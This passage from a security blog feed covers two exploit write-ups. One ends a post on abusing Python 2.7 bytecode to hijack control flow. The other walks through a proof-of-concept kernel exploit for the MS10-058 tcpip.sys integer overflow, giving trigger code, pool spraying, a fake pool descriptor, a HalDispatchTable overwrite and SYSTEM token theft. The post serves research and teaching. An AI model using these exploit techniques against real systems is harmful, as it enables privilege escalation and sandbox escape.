</span><span class='line'><span class="n">addr_first_object_controled_data</span> <span class="o">=</span> <span class="n">addr_first_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
</span><span class='line'>
</span><span class='line'><span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_first_object_controled_data</span><span class="p">)</span>
</span><span class='line'><span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
</span><span class='line'><span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span>  <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span>     <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;LOAD_CONST&#39;</span><span class="p">])</span>    <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;CALL_FUNCTION&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span><span class='line'>  <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">a</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And we finally get our primitive working :&ndash;)</p>

<figure class='code'><figcaption><span>call 0xdeadbeef</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>(11d0.11cc): Access violation - code c0000005 (!!! second chance !!!)
</span><span class='line'>*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Python\Python275\python27.dll -
</span><span class='line'>eax=01cc1030 ebx=00000000 ecx=00422e78 edx=00000000 esi=deadbeef edi=02e62df4
</span><span class='line'>eip=deadbeef esp=0027e78c ebp=02e62df4 iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
</span><span class='line'>deadbeef ??              ???
</span></code></pre></td></tr></table></div></figure>


<p>So now you know all the nasty things going under the hood with that <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script!</p>

<h1>Conclusion, Ideas</h1>

<p>After reading this little post you are now aware that if you want to sandbox efficiently Python, you should do it outside of Python and not by preventing the use of some modules or things like that: this is broken by design. The virtual machine is not safe enough to build a strong sandbox inside Python, so don&rsquo;t rely on such thing if you don&rsquo;t want to get surprised. An article about that exact same thing was written here if you are interested: <a href="https://lwn.net/Articles/574215/">The failure of pysandbox</a>.</p>

<p>You also may want to look at <a href="http://pypy.org/features.html#sandboxing">PyPy&rsquo;s sandboxing capability</a> if you are interested in executing untrusted Python code. Otherwise, you can build your own <a href="https://code.google.com/p/seccompsandbox/wiki/overview">SECCOMP</a>-based system :).</p>

<p>On the other hand, I had a lot of fun taking a deep dive into Python&rsquo;s source code and I hope you had some too! If you would like to know more about the low level aspects of Python here are a list of interesting posts:</p>

<ul>
<li><a href="http://www.jmcneil.net/2012/04/debugging-your-python-with-gdb-ftw/">Debugging Your Python With GDB (FTW!)</a></li>
<li><a href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html">The structure of .pyc files</a></li>
<li><a href="https://www.youtube.com/watch?v=ve7lLHtJ9l8">Bytecode: What, Why, and How to Hack it &ndash; Dr. Ryan F Kelly</a></li>
<li><a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py">Self-modifying Python bytecode</a></li>
<li><a href="http://eli.thegreenplace.net/category/programming/python/python-internals/">Python internals series</a></li>
</ul>


<p>Folks, that&rsquo;s all for today ; don&rsquo;t hesitate to contact us if you have a cool post!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[First dip into the kernel pool : MS10-058]]></title>
    <link href="http://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/"/>
    
    <updated>2014-03-11T09:52:37+00:00</updated>
    <id>http://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>. I think it&rsquo;s a good exercise to start learning about pool overflows.</p>

<h1>Forewords</h1>

<p>If you want to experiment with this vulnerability, you should read <a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html">[1]</a> and be sure to have a vulnerable system. I tested my exploit on a VM with Windows 7 32 bits with tcpip.sys 6.1.7600.16385. The Microsoft bulletin dealing with this vulnerability is MS10-058. It has been found by Matthieu Suiche <a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058">[2]</a> and was used as an example on Tarjei Mandt’s paper <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>.</p>

<h1>Triggering the flaw</h1>

<p>An integer overflow in <em>tcpip!IppSortDestinationAddresses</em> allows to allocate a wrong-sized non-paged pool memory chunk. Below you can see the diff between the vulnerable version and the patched version.</p>

<p><img class="center" src="http://doar-e.github.io/images/MS10-058/diff.png"></p>

<!--more-->


<p>So basically the flaw is merely an integer overflow that triggers a pool overflow.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>IppSortDestinationAddresses(x,x,x)+29   imul    eax, 1Ch
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+2C   push    esi
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+2D   mov     esi, ds:__imp__ExAllocatePoolWithTag@12
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+33   push    edi
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+34   mov     edi, 73617049h
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+39   push    edi
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+3A   push    eax
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+3B   push    ebx
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,x)
</span></code></pre></td></tr></table></div></figure>


<p>You can reach this code using a <em>WSAIoctl</em> with the code <em>SIO_ADDRESS_LIST_SORT</em> using a call like this :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
</span></code></pre></td></tr></table></div></figure>


<p>You have to pass the function a pointer to a <em>SOCKET_ADDRESS_LIST</em> (<em>pwn</em> in the example). This <em>SOCKET_ADDRESS_LIST</em> contains an <em>iAddressCount</em> field and <em>iAddressCount</em> <em>SOCKET_ADDRESS</em> structures. With a high <em>iAddressCount</em> value, the integer will wrap, thus triggering the wrong-sized allocation.  We can almost write anything in those structures. There are only two limitations :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>IppFlattenAddressList(x,x)+25   lea     ecx, [ecx+ebx*8]
</span><span class='line'>IppFlattenAddressList(x,x)+28   cmp     dword ptr [ecx+8], 1Ch
</span><span class='line'>IppFlattenAddressList(x,x)+2C   jz      short loc_4DCA9
</span><span class='line'>
</span><span class='line'>IppFlattenAddressList(x,x)+9C   cmp     word ptr [edx], 17h
</span><span class='line'>IppFlattenAddressList(x,x)+A0   jnz     short loc_4DCA2
</span></code></pre></td></tr></table></div></figure>


<p>The copy will stop if those checks fail. That means that each <em>SOCKET_ADDRESS</em> has a length of 0x1c and that each <em>SOCKADDR</em> buffer pointed to by the socket address begins with a 0x17 byte. Long story short :</p>

<ul>
<li>Make the multiplication at <em>IppSortDestinationAddresses+29</em> overflow</li>
<li>Get a non-paged pool chunk at <em>IppSortDestinationAddresses+3e</em> that is too little</li>
<li>Write user controlled memory to this chunk in <em>IppFlattenAddressList+67</em> and overflow as much as you want (provided that you take care of the 0x1c and 0x17 bytes)</li>
</ul>


<p>The code below should trigger a BSOD. Now the objective is to place an object after our vulnerable object and modify pool metadata.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>WSADATA wd = {0};
</span><span class='line'>SOCKET sock = 0;
</span><span class='line'>SOCKET_ADDRESS_LIST *pwn = (SOCKET_ADDRESS_LIST*)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
</span><span class='line'>DWORD cb;
</span><span class='line'>
</span><span class='line'>memset(buffer,0x41,0x1c);
</span><span class='line'>buffer[0] = 0x17;
</span><span class='line'>buffer[1] = 0x00;
</span><span class='line'>sa.lpSockaddr = (LPSOCKADDR)buffer;
</span><span class='line'>sa.iSockaddrLength = 0x1c;
</span><span class='line'>pwn-&gt;iAddressCount = 0x40000003;
</span><span class='line'>memcpy(&amp;pwn-&gt;Address[0],&amp;sa,sizeof(_SOCKET_ADDRESS));
</span><span class='line'>memcpy(&amp;pwn-&gt;Address[1],&amp;sa,sizeof(_SOCKET_ADDRESS));
</span><span class='line'>memcpy(&amp;pwn-&gt;Address[2],&amp;sa,sizeof(_SOCKET_ADDRESS));
</span><span class='line'>memcpy(&amp;pwn-&gt;Address[3],&amp;sa,sizeof(_SOCKET_ADDRESS));
</span><span class='line'>
</span><span class='line'>WSAStartup(MAKEWORD(2,0), &amp;wd)
</span><span class='line'>sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
</span><span class='line'>WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
</span></code></pre></td></tr></table></div></figure>


<h1>Spraying the pool</h1>

<h2>Non paged objects</h2>

<p>There are several objects that we could easily use to manipulate the non-paged pool. For instance we could use semaphore objects or reserve objects.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>*8516b848 size:   48 previous size:   48  (Allocated) Sema
</span><span class='line'>*85242d08 size:   68 previous size:   68  (Allocated) User
</span><span class='line'>*850fcea8 size:   60 previous size:    8  (Allocated) IoCo
</span></code></pre></td></tr></table></div></figure>


<p>We are trying to overflow a pool chunk with a size being a multiple of 0x1c. As 0x1c*3=0x54, the driver is going to request 0x54 bytes and being therefore given a chunk of 0x60 bytes. This is exactly the size of an I/O completion reserve object. To allocate a IoCo, we just need to call <em>NtAllocateReserveObject</em> with the object type IOCO. To deallocate the IoCo, we could simply close the associate the handle. Doing this would make the object manager release the object. For more in-depth information about reserve objects, you can read j00ru’s article <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">[4]</a>.</p>

<p>In order to spray, we are first going to allocate a lot of IoCo without releasing them so as to fill existing holes in the pool. After that, we want to allocate IoCo and make holes of 0x60 bytes. This is illustrated in the <em>sprayIoCo()</em> function of my PoC. Now we are able have an IoCo pool chunk following an Ipas pool chunk (as you might have noticed, ‘Ipas’ is the tag used by the tcpip driver). Therefore, we can easily corrupt its pool header.</p>

<h2>nt!PoolHitTag</h2>

<p>If you want to debug a specific call to <em>ExFreePoolWithTag</em> and simply break on it you’ll see that there are way too much frees (and above all, this is very slow when kernel debugging). A simple approach to circumvent this issue is to use pool hit tags.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>ExFreePoolWithTag(x,x)+62F                  and     ecx, 7FFFFFFFh
</span><span class='line'>ExFreePoolWithTag(x,x)+635                  mov     eax, ebx
</span><span class='line'>ExFreePoolWithTag(x,x)+637                  mov     ebx, ecx
</span><span class='line'>ExFreePoolWithTag(x,x)+639                  shl     eax, 3
</span><span class='line'>ExFreePoolWithTag(x,x)+63C                  mov     [esp+58h+var_28], eax
</span><span class='line'>ExFreePoolWithTag(x,x)+640                  mov     [esp+58h+var_2C], ebx
</span><span class='line'>ExFreePoolWithTag(x,x)+644                  cmp     ebx, _PoolHitTag
</span><span class='line'>ExFreePoolWithTag(x,x)+64A                  jnz     short loc_5180E9
</span><span class='line'>ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to Debugger
</span></code></pre></td></tr></table></div></figure>


<p>As you can see on the listing above, <em>nt!PoolHitTag</em> is compared against the pool tag of the currently freed chunk. Notice the mask : it allows you to use the raw tag. (for instance ‘oooo’ instead of 0xef6f6f6f) By the way, you are not required to use the genuine tag. (eg : you can use ‘ooo’ for ‘IoCo’) Now you know that you can <em>ed nt!PoolHitTag ‘oooo’</em> to debug your exploit.</p>

<h1>Exploitation technique</h1>

<h2>Basic structure</h2>

<p>As the internals of the pool are thoroughly detailed in Tarjei Mandt’s paper <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>, I will only be giving a glimpse at the pool descriptor and the pool header structures. The pool memory is divided into several types of pool. Two of them are the paged pool and the non-paged pool. A pool is described by a <em>_POOL_DESCRIPTOR</em> structure as seen below.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0: kd&gt; dt _POOL_TYPE
</span><span class='line'>ntdll!_POOL_TYPE
</span><span class='line'>   NonPagedPool = 0n0
</span><span class='line'>   PagedPool = 0n1
</span></code></pre></td></tr></table></div></figure>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0: kd&gt; dt _POOL_DESCRIPTOR
</span><span class='line'>nt!_POOL_DESCRIPTOR
</span><span class='line'>   +0x000 PoolType         : _POOL_TYPE
</span><span class='line'>   +0x004 PagedLock        : _KGUARDED_MUTEX
</span><span class='line'>   +0x004 NonPagedLock     : Uint4B
</span><span class='line'>   +0x040 RunningAllocs    : Int4B
</span><span class='line'>   +0x044 RunningDeAllocs  : Int4B
</span><span class='line'>   +0x048 TotalBigPages    : Int4B
</span><span class='line'>   +0x04c ThreadsProcessingDeferrals : Int4B
</span><span class='line'>   +0x050 TotalBytes       : Uint4B
</span><span class='line'>   +0x080 PoolIndex        : Uint4B
</span><span class='line'>   +0x0c0 TotalPages       : Int4B
</span><span class='line'>   +0x100 PendingFrees     : Ptr32 Ptr32 Void
</span><span class='line'>   +0x104 PendingFreeDepth : Int4B
</span><span class='line'>   +0x140 ListHeads        : [512] _LIST_ENTRY
</span></code></pre></td></tr></table></div></figure>


<p>A pool descriptor references free memory in a free list called <em>ListHeads</em>. The <em>PendingFrees</em> field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as <em>PoolVector</em> (non-paged) or <em>ExpPagedPoolDescriptor</em> (paged). Each chunk of memory contains a header before the actual data. This is the <em>_POOL_HEADER</em>. It brings information such as the size of the block or the pool it belongs to.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0: kd&gt; dt _POOL_HEADER
</span><span class='line'>nt!_POOL_HEADER
</span><span class='line'>   +0x000 PreviousSize     : Pos 0, 9 Bits
</span><span class='line'>   +0x000 PoolIndex        : Pos 9, 7 Bits
</span><span class='line'>   +0x002 BlockSize        : Pos 0, 9 Bits
</span><span class='line'>   +0x002 PoolType         : Pos 9, 7 Bits
</span><span class='line'>   +0x000 Ulong1           : Uint4B
</span><span class='line'>   +0x004 PoolTag          : Uint4B
</span><span class='line'>   +0x004 AllocatorBackTraceIndex : Uint2B
</span><span class='line'>   +0x006 PoolTagHash      : Uint2B
</span></code></pre></td></tr></table></div></figure>


<h2>PoolIndex overwrite</h2>

<p>The basic idea of this attack is to corrupt the <em>PoolIndex</em> field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0: kd&gt; dd ExpPagedPoolDescriptor
</span><span class='line'>82947ae0  84835000 84836140 84837280 848383c0
</span><span class='line'>82947af0  84839500 00000000 00000000 00000000
</span></code></pre></td></tr></table></div></figure>


<p>As there are always some null pointers after the array, it could be used to craft a fake pool descriptor in a user-allocated null page.</p>

<h2>Non paged pool type</h2>

<p>To determine the <em>_POOL_DESCRIPTOR</em> to use, <em>ExFreePoolWithTag</em> gets the appropriate <em>_POOL_HEADER</em> and stores <em>PoolType</em> (<em>watchMe</em>) and <em>BlockSize</em> (<em>var_3c</em>)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>ExFreePoolWithTag(x,x)+465
</span><span class='line'>ExFreePoolWithTag(x,x)+465  loc_517F01:
</span><span class='line'>ExFreePoolWithTag(x,x)+465  mov     edi, esi
</span><span class='line'>ExFreePoolWithTag(x,x)+467  movzx   ecx, word ptr [edi-6]
</span><span class='line'>ExFreePoolWithTag(x,x)+46B  add     edi, 0FFFFFFF8h
</span><span class='line'>ExFreePoolWithTag(x,x)+46E  movzx   eax, cx
</span><span class='line'>ExFreePoolWithTag(x,x)+471  mov     ebx, eax
</span><span class='line'>ExFreePoolWithTag(x,x)+473  shr     eax, 9
</span><span class='line'>ExFreePoolWithTag(x,x)+476  mov     esi, 1FFh
</span><span class='line'>ExFreePoolWithTag(x,x)+47B  and     ebx, esi
</span><span class='line'>ExFreePoolWithTag(x,x)+47D  mov     [esp+58h+var_40], eax
</span><span class='line'>ExFreePoolWithTag(x,x)+481  and     eax, 1
</span><span class='line'>ExFreePoolWithTag(x,x)+484  mov     edx, 400h
</span><span class='line'>ExFreePoolWithTag(x,x)+489  mov     [esp+58h+var_3C], ebx
</span><span class='line'>ExFreePoolWithTag(x,x)+48D  mov     [esp+58h+watchMe], eax
</span><span class='line'>ExFreePoolWithTag(x,x)+491  test    edx, ecx
</span><span class='line'>ExFreePoolWithTag(x,x)+493  jnz     short loc_517F49
</span></code></pre></td></tr></table></div></figure>


<p>Later, if <em>ExpNumberOfNonPagedPools</em> equals 1, the correct pool descriptor will directly be taken from <em>nt!PoolVector[0]</em>. The PoolIndex is not used.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>ExFreePoolWithTag(x,x)+5C8  loc_518064:
</span><span class='line'>ExFreePoolWithTag(x,x)+5C8  mov     eax, [esp+58h+watchMe]
</span><span class='line'>ExFreePoolWithTag(x,x)+5CC  mov     edx, _PoolVector[eax*4]
</span><span class='line'>ExFreePoolWithTag(x,x)+5D3  mov     [esp+58h+var_48], edx
</span><span class='line'>ExFreePoolWithTag(x,x)+5D7  mov     edx, [esp+58h+var_40]
</span><span class='line'>ExFreePoolWithTag(x,x)+5DB  and     edx, 20h
</span><span class='line'>ExFreePoolWithTag(x,x)+5DE  mov     [esp+58h+var_20], edx
</span><span class='line'>ExFreePoolWithTag(x,x)+5E2  jz      short loc_5180B6
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>ExFreePoolWithTag(x,x)+5E8  loc_518084:
</span><span class='line'>ExFreePoolWithTag(x,x)+5E8  cmp     _ExpNumberOfNonPagedPools, 1
</span><span class='line'>ExFreePoolWithTag(x,x)+5EF  jbe     short loc_5180CB
</span><span class='line'>
</span><span class='line'>ExFreePoolWithTag(x,x)+5F1  movzx   eax, word ptr [edi]
</span><span class='line'>ExFreePoolWithTag(x,x)+5F4  shr     eax, 9
</span><span class='line'>ExFreePoolWithTag(x,x)+5F7  mov     eax, _ExpNonPagedPoolDescriptor[eax*4]
</span><span class='line'>ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
</span></code></pre></td></tr></table></div></figure>


<p>Therefore, you have to make the pool manager believe that the chunk is located in paged memory.</p>

<h2>Crafting a fake pool descriptor</h2>

<p>As we want a fake pool descriptor at null address. We just allocate this page and put a fake deferred free list and a fake ListHeads.</p>

<p>When freeing a chunk, if the deferred freelist contains at least 0x20 entries, <em>ExFreePoolWithTag</em> is going to actually free those chunks and put them on the appropriate entries of the <em>ListHeads</em>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>*(PCHAR*)0x100 = (PCHAR)0x1208;
</span><span class='line'>*(PCHAR*)0x104 = (PCHAR)0x20;
</span><span class='line'>for (i = 0x140; i &lt; 0x1140; i += 8) {
</span><span class='line'>    *(PCHAR*)i = (PCHAR)WriteAddress-4;
</span><span class='line'>}
</span><span class='line'>*(PINT)0x1200 = (INT)0x060c0a00;
</span><span class='line'>*(PINT)0x1204 = (INT)0x6f6f6f6f;
</span><span class='line'>*(PCHAR*)0x1208 = (PCHAR)0x0;
</span><span class='line'>*(PINT)0x1260 = (INT)0x060c0a0c;
</span><span class='line'>*(PINT)0x1264 = (INT)0x6f6f6f6f;
</span></code></pre></td></tr></table></div></figure>


<h2>Notes</h2>

<p>It is interesting to note that this attack would not work with modern mitigations. Here are a few reasons :</p>

<ul>
<li>Validation of the <em>PoolIndex</em> field</li>
<li>Prevention of the null page allocation</li>
<li><em>NonPagedPoolNX</em> has been introduced with Windows 8 and should be used instead of the <em>NonPagedPool</em> type.</li>
<li>SMAP would prevent access to userland data</li>
<li>SMEP would prevent execution of userland code</li>
</ul>


<h1>Payload and clean-up</h1>

<p>A classical target for write-what-where scenarios is the <em>HalDispatchTable</em>. We just have to overwrite <em>HalDispatchTable+4</em> with a pointer to our payload which is <em>setupPayload()</em>. When we are done, we just have to put back the pointer to <em>hal!HaliQuerySystemInformation</em>. (otherwise you can expect some crashes)</p>

<p>Now that we are able to execute arbitrary code from kernel land we just have to get the <em>_EPROCESS</em> of the attacking process with <em>PsGetCurrentProcess()</em> and walk the list of processes using the <em>ActiveProcessLinks</em> field until we encounter a process with <em>ImageFileName</em> equal to “System”. Then we just replace the access token of the attacker process by the one of the system process. Note that the lazy author of this exploit hardcoded several offsets :).</p>

<p>This is illustrated in <em>payload()</em>.</p>

<p><img class="center" src="http://doar-e.github.io/images/MS10-058/screenshot.png"></p>

<h1>Greetings</h1>

<p>Special thanks to my friend <a href="https://twitter.com/0vercl0k">@0vercl0k</a> for his review and help!</p>

<h1>Conclusion</h1>

<p>I hope you enjoyed this article. If you want to know more about the topic, check out the latest papers of Tarjei Mandt, Zhenhua Liu and Nikita Tarakanov. (or wait for other articles ;) )</p>

<p>You can find my code on my new github <a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">[5]</a>. Don’t hesitate to share comments on my article or my exploit if you see something wrong :)</p>

<h1>References</h1>

<p>[1] <a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html">Vulnerability details on itsecdb</a></p>

<p>[2] <a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058">MS bulletin</a></p>

<p>[3] <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">Kernel Pool Exploitation on Windows 7</a> &ndash; Tarjei Mandt&rsquo;s paper. A must-read!</p>

<p>[4] <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">Reserve Objects in Windows 7</a> &ndash; Great j00ru&rsquo;s article!</p>

<p>[5] <a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">The code of my exploit for MS10-058</a></p>
]]></content>
    
  </entry>
  
  <entry>
